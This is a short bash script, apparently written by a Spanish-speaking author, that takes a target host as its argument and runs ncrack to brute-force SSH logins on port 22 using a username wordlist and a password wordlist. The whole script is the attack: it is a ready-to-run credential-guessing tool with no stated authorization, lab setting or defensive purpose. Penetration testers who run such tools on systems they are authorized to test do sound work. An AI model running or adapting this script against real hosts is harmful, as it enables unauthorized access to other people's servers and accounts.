#!/bin/bash
echo 
echo 
echo $1 "<======================"
ncrack ssh://$1:22 -U usuarios0.txt -P claves0.txt 
